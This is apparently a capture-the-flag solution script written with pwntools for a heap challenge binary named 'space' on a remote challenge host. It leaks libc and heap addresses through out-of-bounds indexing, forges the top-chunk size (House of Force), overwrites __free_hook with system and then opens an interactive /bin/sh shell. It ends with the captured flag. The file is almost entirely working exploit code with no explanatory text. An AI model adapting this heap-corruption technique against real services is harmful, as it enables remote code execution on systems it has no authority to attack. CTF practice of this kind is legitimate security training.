from pwn import *

exe = ELF('./space')
context.binary = exe

host = 'jh2i.com'
port = 50016
io = connect(host, port)


def make(fname, lname, fuck, fuck2, year=1992, month=2000, day=0, commentlen=10, comment=b''):
    io.sendlineafter('> ', '1')
    io.sendlineafter('name: ', fname)
    io.sendlineafter('name: ', lname)
    io.sendlineafter('[y]: ', fuck[0])
    if fuck[0] == 'y':
        io.sendlineafter(':', str(year))
        io.sendlineafter(':', str(month))
        io.sendlineafter(':', str(day))
    io.sendlineafter('[y]: ', fuck2[0])
    if fuck2[0] == 'y':
        io.sendlineafter(':', str(commentlen))
        io.sendlineafter(':', comment)
    io.sendlineafter('[y/n]', 'n')


def delete():
    io.sendlineafter('> ', '4')
    io.sendlineafter('[y/n]', 'n')


def show(idx):
    io.sendlineafter('> ', '3')
    io.sendlineafter('user: ', str(idx))


def launch():
    io.sendlineafter('> ', '5')
    io.sendlineafter('[y/n]', 'n')


def return_size(target, wilderness):
    return target - wilderness - 0x10


# offsets
mainarena_offset = 0x3ebc40
free_hook = 0x3ed8e8
malloc_hook = 0x3ebc30
system = 0x4f4e0
# leak libc
show(38)
io.recvuntil('Last name: ')
libc_base = u64(io.recvn(6) + b'\x00\x00') - (0x7fe48aceb8d0 - 0x7fe48ab51000)
log.info('Libc base {}'.format(hex(libc_base)))
io.sendlineafter('[y/n]', 'n')
# leak heap
for i in range(3):
    make('HKHK', 'HKHK', 'n', 'n')
show(-11)
io.recvuntil('First name: ')
heap_base = u64(io.recvn(6) + b'\x00\x00') - 0x380
log.info('Heap base {}'.format(hex(heap_base)))
make(b'HKHK', b'HKHK', b'y', b'n', year=0x10, month=b'A' * 0x10 + p64(0xffffffffffffffff), day=10)
make(b'HKHK', b'HKHK', b'n', b'y', commentlen=return_size(libc_base + free_hook - 0xe0, heap_base + 0x498),
     comment=b'AAAAAA')
make(b'', p64(0x0) + p64(0x0) + p64(0x0) + p64(libc_base + system), b'n', b'n')
io.sendlineafter('[y/n]', 'n')
make(b'HKHK', b'HKHK', b'n', b'y', commentlen=0x20, comment=b'/bin/sh\x00')
io.sendlineafter('> ', '4')
io.interactive()

# FLAG --> flag{michael_scott_for_president}
